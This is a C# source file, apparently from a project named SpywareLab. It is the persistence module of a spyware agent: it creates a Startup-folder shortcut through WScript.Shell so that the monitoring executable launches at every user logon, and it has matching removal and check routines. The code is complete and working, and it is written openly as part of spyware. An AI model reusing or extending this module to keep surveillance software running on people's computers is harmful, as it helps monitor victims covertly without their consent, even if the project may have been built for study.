using System.Runtime.InteropServices;
using Spyware.Core.Logging;

namespace Spyware.Persistence;

/// <summary>
/// Método alternativo/complementario: carpeta de Inicio del usuario.
/// El .lnk se crea con WScript.Shell (late binding) para evitar referencias COM.
/// </summary>
public sealed class StartupFolderInstaller
{
    private const int DeleteAttempts = 5;

    private static string StartupFolder => Environment.GetFolderPath(Environment.SpecialFolder.Startup);

    public string GetShortcutPath(string valueName) =>
        Path.Combine(StartupFolder, Sanitize(valueName) + ".lnk");

    public void Install(string valueName, string executablePath, ILog log)
    {
        string shortcut = GetShortcutPath(valueName);
        Directory.CreateDirectory(Path.GetDirectoryName(shortcut)!);

        Type? shellType = Type.GetTypeFromProgID("WScript.Shell")
            ?? throw new InvalidOperationException("WScript.Shell no está disponible.");

        dynamic shell = Activator.CreateInstance(shellType)!;
        dynamic link = shell.CreateShortcut(shortcut);
        link.TargetPath = executablePath;
        link.WorkingDirectory = Path.GetDirectoryName(executablePath);
        link.Description = "Agente de monitorización SpywareLab";
        link.Save();

        // El shell mantiene el .lnk abierto mientras el RCW siga vivo: se libera
        // aquí para que el desinstalador pueda borrar el archivo.
        Release((object)link);
        Release((object)shell);

        log.Info("Acceso directo de inicio creado en " + shortcut);
    }

    public void Remove(string valueName, ILog log)
    {
        string shortcut = GetShortcutPath(valueName);
        if (!File.Exists(shortcut)) return;

        Exception? last = null;
        for (int attempt = 1; attempt <= DeleteAttempts; attempt++)
        {
            try
            {
                File.Delete(shortcut);
                log.Info("Acceso directo de inicio eliminado: " + shortcut);
                return;
            }
            catch (IOException ex)
            {
                // El explorador/autorrun suele tener el .lnk abierto justo después
                // de crearlo: reintentos cortos antes de rendirse.
                last = ex;
                Thread.Sleep(200 * attempt);
            }
            catch (Exception ex)
            {
                last = ex;
                break;
            }
        }

        log.Warn("No se pudo eliminar el acceso directo: " + last?.Message);
    }

    public bool IsInstalled(string valueName) => File.Exists(GetShortcutPath(valueName));

    private static void Release(object instance)
    {
        try
        {
            while (Marshal.ReleaseComObject(instance) > 0) { }
        }
        catch (Exception)
        {
            // el objeto ya estaba suelto: no hay nada que liberar
        }
    }

    private static string Sanitize(string valueName)
    {
        foreach (char invalid in Path.GetInvalidFileNameChars())
            valueName = valueName.Replace(invalid, '_');

        return valueName;
    }
}
